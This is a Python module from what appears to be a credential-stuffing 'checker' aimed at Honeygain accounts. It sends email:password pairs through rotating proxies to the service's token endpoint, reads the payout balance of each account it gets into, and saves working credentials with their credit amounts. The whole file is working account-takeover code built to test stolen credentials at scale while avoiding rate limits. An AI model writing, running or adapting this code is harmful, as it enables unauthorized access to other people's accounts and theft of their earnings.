from modules.variables import Checker
from requests import Session
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {"email":email,"password":password}
                r = s.post("https://dashboard.honeygain.com/api/v1/users/tokens",json=payload)
                if "Bad credentials." in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "access_token" not in r.text:
                    raise
                
                token = r.json()['data']['access_token']
                header = {"Authorization":f"Bearer {token}"}
                balance = s.get("https://dashboard.honeygain.com/api/v1/users/balances",headers=header).json()["data"]["payout"]["credits"]
                if int(balance) > 0: 
                    if not Checker.cui:  log("good",":".join([email,password]),"Honeygain")
                    save("Honeygain","good",Checker.time,":".join([email,password])+f" | Credits: {balance}")
                    Checker.good += 1
                    return_proxy(proxy)
                    return
                
                if not Checker.cui:  log("custom",":".join([email,password]),"Honeygain")
                save("Honeygain","custom",Checker.time,":".join([email,password])+f" | Credits: {balance}")
                Checker.custom += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        